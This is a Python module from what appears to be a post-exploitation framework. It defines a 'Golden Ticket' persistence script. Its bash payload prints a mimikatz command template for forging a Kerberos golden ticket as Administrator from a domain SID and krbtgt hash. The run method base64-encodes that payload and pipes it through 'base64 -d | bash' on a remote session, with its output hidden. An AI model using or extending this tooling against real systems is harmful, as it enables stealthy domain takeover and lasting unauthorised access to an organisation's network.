"""Kerberos golden ticket script."""
from ..base import OperatorScript, ScriptResult

class GoldenTicket(OperatorScript):
    name = "Golden Ticket"
    description = "Kerberos golden ticket creation"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] KERBEROS GOLDEN TICKET"
echo "Requires: Domain SID and krbtgt hash"
echo "mimikatz: kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Golden ticket info...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Golden ticket info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
